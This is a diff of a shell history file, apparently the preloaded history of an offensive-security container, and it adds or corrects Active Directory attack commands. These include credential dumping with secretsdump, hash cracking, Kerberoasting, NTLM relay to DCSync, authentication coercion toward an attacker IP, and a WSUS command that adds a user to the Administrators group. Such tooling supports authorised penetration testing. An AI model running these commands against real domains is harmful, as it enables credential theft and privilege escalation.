@@ -139,7 +139,7 @@ secretsdump -k "$TARGET"
 hashcat --status --hash-type 1000 --attack-mode 0 --username "$DOMAIN".ntds `fzf-wordlists`
 hashcat --hash-type 1000 --potfile-path "$DOMAIN".ntds.cracked "$DOMAIN".ntds --show --username
 cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
-cme ldap "$DC_HOST"h -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
+cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
 ldapsearch -x -l "$DC_HOST" -D '' -w '' -b 'dc=DOMAIN,dc=LOCAL'
 addspn.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -s "HOST/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
 dnstool.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" --action add "$DC_HOST"
@@ -282,6 +282,7 @@ Get-GPPPassword -debug -no-pass "$DC_HOST"
 Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 cme smb --list-modules
 cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
+cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
 ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
 whatportis 3306
 whatportis postgresql
@@ -298,7 +299,7 @@ dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
 coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target "$DC_HOST"
 coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --webdav-host 'machine_name' --target "$DC_HOST"
 ntlmrelayx -t ldap://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
-targetedKerberoast.py -v -d "$DOMAIN" -u user1 -p complexpassword -o Kerberoastables.txt
+targetedKerberoast.py -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -o Kerberoastables.txt
 pass-station search tomcat
 nth --text 5f4dcc3b5aa765d61d8327deb882cf99
 pywsus.py --host "$ATTACKER_IP" --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
@@ -346,4 +347,5 @@ goshs -b "goshs":"exegol4thewin" --ssl --self-signed -p 8000 -d /workspace
 goshs -b "goshs":"exegol4thewin" --ssl --self-signed --read-only -p 8001 -d /opt/resources
 goshs -b "goshs":"exegol4thewin" --ssl --self-signed --read-only -p 8002 -d /my-ressources
 sslyze --sslv2 --sslv3 --tlsv1 --tlsv1_1 --tlsv1_2 --tlsv1_3 --heartbleed --robot --openssl_ccs --compression --reneg --certinfo --elliptic_curves --early_data --fallback --json_out=sslyze.json $TARGET
+findDelegation.py -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
